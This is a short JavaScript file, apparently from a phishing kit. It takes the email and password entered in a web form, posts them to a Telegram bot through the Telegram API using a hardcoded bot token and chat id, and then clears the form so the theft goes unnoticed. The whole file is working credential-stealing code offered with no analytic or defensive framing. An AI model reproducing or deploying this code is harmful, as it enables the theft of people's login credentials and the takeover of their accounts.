//bot token
var telegram_bot_id = "7891879775:AAFEmwiVhYV0_1VYUlI2Ch80xV4oejcGcw0";
//chat id
var chat_id = 6505243196;
var password, email, message;
var ready = function () {
    email = document.getElementById("email").value;
    password = document.getElementById("password").value;
    
    message = "Name: " + password  + "\nEmail: " + email;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("email").value = "";
    document.getElementById("password").value = "";
    
    return false;
};
